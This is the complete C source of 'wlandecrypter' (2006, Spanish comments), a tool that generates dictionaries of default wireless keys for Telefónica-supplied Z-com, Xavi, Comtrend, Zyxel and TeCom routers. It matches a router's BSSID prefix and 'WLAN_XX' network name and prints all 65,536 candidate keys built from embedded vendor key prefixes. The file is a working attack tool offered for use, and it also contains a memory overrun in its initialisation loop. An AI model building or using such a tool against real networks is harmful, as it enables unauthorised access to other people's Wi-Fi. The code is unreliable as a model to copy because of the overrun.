/*****************************************************************************
* Fichero:			wlandecrypter.c
* Fecha:			23-03-2006
* Autor:			Nilp0inteR (nilp0inter2k6[at]gmail[dot]com)
* Actualizado:			17-05-2006
*
* Descripcion: Generador de diccionario de claves por defecto para los 
* router de Timofonik Zyxel, Xavvy y Comtrend.
*
* Este programa es software libre; puedes redistribuirlo y/o modificarlo
* bajo los terminos de la Licencia Publica General GNU (GPL) publicada
* por la Free Software Foundation; en su version numero 2, o (bajo tu 
* criterio) la ultima version. Mira http://www.fsf.org/copyleft/gpl.txt.
* 
* Este programa se distribuye SIN GARANTIA de ningun tipo.
*
*****************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//
// Numero de modelos de routers en la base de datos
//
#define MAXROUTER 6
#define MAXINDEX 1
#define VERSION 0
#define SUBVERSION 4

//
// Tipo de dato Router, con toda la informacion
//
typedef struct Router
{
	char bssid[9];
	char init[MAXINDEX][8];
	char notas[30];
} tRouter;

//
// Variables globales
//
char hex[16]="0123456789ABCDEF";

//
// Funciones
//
void initRouters(tRouter routers[MAXROUTER]);
void datosRouters(tRouter routers[MAXROUTER]);
void muestraAyuda();
int buscaBssid(tRouter routers[MAXROUTER], char *bssid);
void imprimeClaves(FILE *fichero, tRouter routers[MAXROUTER], int bssidId, char *keyEnd);

//
// MAIN !!!
//
int main(int argc, char *argv[])
{
	int bssidId, i;
	int validHex=0;
	char endKey[2];
	tRouter routers[MAXROUTER];
	FILE *fichero;
	
	if(argc<3 || argc>4)
	{
		muestraAyuda();
		return 1;
	}

	fprintf(stderr, "\nwlandecrypter %i.%i - (c) 2006 nilp0inter2k6_at_gmail.com\n", VERSION, SUBVERSION);
	fprintf(stderr, "------------>  http://www.rusoblanco.com  <------------\n\n");

	if(strlen(argv[1])!=17)
	{
		fprintf(stderr," [-] Longitud de BSSID invalida\n");
		return 1;
	}
		
	initRouters(routers);
	datosRouters(routers);


	bssidId=buscaBssid(routers, argv[1]);

	if(bssidId==-1)
	{
		fprintf(stderr, " [-] BSSID no encontrado\n");
		return 1;
	}
	else
	{
		fprintf(stderr, " [+] BSSID: %s\n" 
				" [+] Modelo: %s\n", argv[1], routers[bssidId].notas);

		for(i=0;i<strlen(argv[2]);i++)
			argv[2][i]=toupper(argv[2][i]);

		if(strlen(argv[2])<7 || strlen(argv[2])>9 || strncmp("WLAN_", argv[2], 5) != 0 )
		{
			fprintf(stderr, " [-] ESSID: %s invalido!!\n", argv[2]);
			return 1;
		}
		else
		{
			for(i=0;i<strlen(hex);i++)
			{
				if(argv[2][5]==hex[i])
				{
					validHex++;
					break;
				}
			}
			for(i=0;i<strlen(hex);i++)
			{
				if(argv[2][6]==hex[i])
				{
					validHex++;
					break;
				}
			}

			if(validHex!=2)
			{
				fprintf(stderr, " [-] ESSID: %s invalido!!\n", argv[2]);
				return 1;
			}
			else
			{
				endKey[0]=argv[2][5];
				endKey[1]=argv[2][6];

				fprintf(stderr," [+] ESSID: %s\n", argv[2]);
				
				if(argc>3) // Fichero
				{
					
					fprintf(stderr," [+] Fichero de claves: %s\n", argv[3]);
					fichero=fopen(argv[3], "a+");
					if(fichero!=NULL)
					{
						imprimeClaves(fichero,routers,bssidId,endKey);
						fclose(fichero);
						fprintf(stderr, " [+] Fichero guardado\n");
					}
					else
					{
						fprintf(stderr," [-] Error al abrir el fichero\n");
						return 1;
					}
				}
				else
				{
					fprintf(stderr," [+] Seleccionada salida estandar\n");
					imprimeClaves(stdout,routers,bssidId,endKey);
				}
			}
		}

	}
		
	return 0;
}	

//
// Vacia la estructura routers
//
void initRouters(tRouter routers[MAXROUTER])
{
	int i,j;
	for(j=0;j<MAXROUTER;j++)
	{
		strcpy(routers[j].bssid,"");
		for(i=0;i<5;i++)
			strcpy(routers[j].init[i],"");
		strcpy(routers[j].notas,"");
	}
}

//
// Introduce los datos de los modelos conocidos
//
void datosRouters(tRouter routers[MAXROUTER])
{

	// Z-com
	strcpy(routers[0].bssid,"00:60:B3\0");
	strcpy(routers[0].init[0],"Z001349\0");
	strcpy(routers[0].notas,"Z-com\0");

	// Xavvy
	strcpy(routers[1].bssid,"00:01:38\0");
	strcpy(routers[1].init[0],"X000138\0");
	strcpy(routers[1].notas,"Xavi 7768r\0");

	// Comtrend
	strcpy(routers[2].bssid,"00:03:C9\0");
	strcpy(routers[2].init[0],"C0030DA\0");
	strcpy(routers[2].notas,"Comtrend 535\0");

	
	// Zyxel : Gracias a thefkboss de foro.elhacker.net por esta observacion
	strcpy(routers[3].bssid,"00:A0:C5\0"); 
	strcpy(routers[3].init[0],"Z001349\0");
	strcpy(routers[3].notas,"Zyxel 650HW/660HW\0");

	// Comtrend NUEVO, gracias a dnreinad por el coche xD
	strcpy(routers[4].bssid,"00:16:38\0");
	strcpy(routers[4].init[0],"C0030DA\0");
	strcpy(routers[4].notas,"Comtrend 536+\0");

	//Tecom
	strcpy(routers[5].bssid,"00:19:15\0");
	strcpy(routers[5].init[0],"C0030DA\0");
	strcpy(routers[5].notas,"TeCom 536+\0");
	

}

//
// Muestra la ayuda del programa
//
void muestraAyuda()
{
	fprintf(stderr, "\nwlandecrypter %i.%i - (c) 2006 nilp0inter2k6_at_gmail.com\n", VERSION, SUBVERSION);
	fprintf(stderr, "------------>  http://www.rusoblanco.com  <------------\n\n");

	fprintf(stderr, "  uso: wlandecrypter <bssid> <essid> [output file]\n\n");
}

//
// Busca el bssid en la estructura y devuelve el identificador o
//  -1 si no existe
//
int buscaBssid(tRouter routers[MAXROUTER], char *bssid)
{
	int i;
	
	for(i=0;i<strlen(bssid);i++)
		bssid[i]=toupper(bssid[i]);

	for(i=0;i<MAXROUTER;i++)
	{
		if(strncmp ( routers[i].bssid, bssid, 8 ) == 0)
			return i;
	}
	
	return -1;
}

//
// Imprime las claves en un fichero 
//
void imprimeClaves(FILE *fichero, tRouter routers[MAXROUTER], int bssidId, char *keyEnd)
{
	int i,j,k,l,index=0;
	
	while(index<MAXINDEX && strcmp(routers[bssidId].init[index], ""))
	{
	        for(i=0;i<16;i++)
	                for(j=0;j<16;j++)
	                        for(k=0;k<16;k++)
	                                for(l=0;l<16;l++)
	                                {
						fprintf(fichero, "%s%c%c%c%c%c%c\n",routers[bssidId].init[index],hex[i],hex[j],hex[k],hex[l],keyEnd[0],keyEnd[1]);
	                                }
		index++;
	}

}

